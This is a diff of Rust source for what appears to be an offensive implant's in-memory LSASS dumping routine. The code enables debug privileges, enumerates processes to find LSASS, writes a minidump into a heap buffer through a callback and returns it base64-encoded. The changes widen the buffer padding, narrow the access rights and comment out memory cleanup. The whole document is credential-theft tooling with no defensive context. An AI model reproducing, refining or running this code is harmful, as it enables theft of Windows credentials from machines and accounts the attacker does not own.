@@ -1,43 +1,31 @@
 #![allow(non_snake_case)]
+#![allow(non_camel_case_types)]
 use winapi::{
     ctypes::c_void,
     shared::{
-        basetsd::{DWORD_PTR, SIZE_T},
-        ntdef::{
+        basetsd::{DWORD_PTR, SIZE_T}, minwindef::{BOOL, DWORD, FARPROC, HMODULE, LPCVOID, LPVOID, MAX_PATH, PDWORD}, ntdef::{
             HANDLE, 
             HRESULT,
             LPCWSTR,
             LUID,
             NTSTATUS,
-        },
-        minwindef::{BOOL, DWORD, FARPROC, HMODULE, LPCVOID, LPVOID, MAX_PATH, PDWORD},
-        winerror::{
+        }, winerror::{
             ERROR_NOT_ALL_ASSIGNED,
             S_FALSE, 
             S_OK
-        },
+        }
     },
     um::{
         libloaderapi::{GetProcAddress, LoadLibraryW}, // resolve these dynamically
         psapi::{PPROCESS_MEMORY_COUNTERS, PROCESS_MEMORY_COUNTERS},
         winnt::{
-            ACCESS_MASK,
-            HEAP_ZERO_MEMORY,
-            LUID_AND_ATTRIBUTES, 
-            MAXIMUM_ALLOWED,
-            PTOKEN_PRIVILEGES,
-            RtlCopyMemory, 
-            SE_DEBUG_NAME,
-            SE_PRIVILEGE_ENABLED,
-            TOKEN_ADJUST_PRIVILEGES,
-            TOKEN_PRIVILEGES,
-            TOKEN_QUERY,
+            RtlCopyMemory, ACCESS_MASK, HEAP_ZERO_MEMORY, LUID_AND_ATTRIBUTES, PROCESS_QUERY_INFORMATION, PROCESS_VM_READ, PTOKEN_PRIVILEGES, SE_DEBUG_NAME, SE_PRIVILEGE_ENABLED, TOKEN_ADJUST_PRIVILEGES, TOKEN_PRIVILEGES, TOKEN_QUERY
         },
     },
 };
 use std::{
     ffi::OsStr,
-    mem::{drop, forget, MaybeUninit, size_of, size_of_val},
+    mem::{MaybeUninit, size_of, size_of_val},
     os::windows::ffi::OsStrExt,
     slice::from_raw_parts_mut,
 };
@@ -405,7 +393,7 @@ pub fn in_memory_dump(args: Vec<&str>) -> String {
     
     while unsafe { NtGetNextProcess(
         handle,
-        MAXIMUM_ALLOWED,
+        PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
         0,
         0,
         &mut handle,
@@ -440,7 +428,8 @@ pub fn in_memory_dump(args: Vec<&str>) -> String {
     }
 
     // get lsass size and add padding
-    let extra_5mb: usize = 1024*1024 * 5;
+    //can probably reduce this to 10mb or something
+    let extra_50mb: usize = 1024*1024 * 50;
     let buf_size: usize;
     let mut pmc = MaybeUninit::<PROCESS_MEMORY_COUNTERS>::uninit();
     let gpm_ret = unsafe { GetProcessMemoryInfo(
@@ -450,7 +439,7 @@ pub fn in_memory_dump(args: Vec<&str>) -> String {
     )};
     if gpm_ret != 0 {
         let pmc = unsafe { pmc.assume_init() };
-        buf_size = pmc.WorkingSetSize + extra_5mb;
+        buf_size = pmc.WorkingSetSize + extra_50mb;
     } else {
         return "".to_string()
     }
@@ -463,7 +452,7 @@ pub fn in_memory_dump(args: Vec<&str>) -> String {
         HEAP_ZERO_MEMORY,
         buf_size
     )};
-    forget(buf);
+    //forget(buf);
 
     // set up minidump callback
     let mut callback_info = MINIDUMP_CALLBACK_INFORMATION {
@@ -492,7 +481,8 @@ pub fn in_memory_dump(args: Vec<&str>) -> String {
         0 as _,
         buf
     )};
-    drop(buf);
+    //drop(buf);
 
     return buf_b64
 }
+
